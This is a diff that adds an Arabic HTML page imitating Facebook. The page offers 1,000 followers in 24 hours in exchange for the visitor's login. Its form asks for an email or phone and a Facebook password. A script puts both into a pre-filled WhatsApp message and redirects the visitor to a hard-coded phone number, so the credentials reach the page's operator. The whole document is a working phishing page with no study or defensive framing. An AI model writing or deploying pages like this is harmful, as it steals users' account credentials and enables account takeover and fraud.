@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>زيادة متابعين فيسبوك</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1877f2;
+            margin: 0;
+            padding: 0;
+            color: white;
+            text-align: center;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            color: #333;
+        }
+        h1 {
+            color: #1877f2;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="فيسبوك" class="logo">
+        <h1>زيادة متابعين فيسبوك</h1>
+        <p>أدخل معلوماتك للحصول على 1000 متابع خلال 24 ساعة</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني أو الهاتف:</label>
+                <input type="text" id="email" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">كلمة المرور:</label>
+                <input type="password" id="password" required>
+            </div>
+            
+            <button type="button" onclick="prepareMessage()">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <script>
+        function prepareMessage() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            const message = `طلب جديد لزيادة المتابعين:\n\nبريد إلكتروني/هاتف: ${email}\nكلمة المرور: ${password}`;
+            
+            // توجيه المستخدم إلى واتساب مع البيانات مكتوبة مسبقًا
+            window.location.href = `https://wa.me/905525439562?text=${encodeURIComponent(message)}`;
+        }
+    </script>
+</body>
+</html>
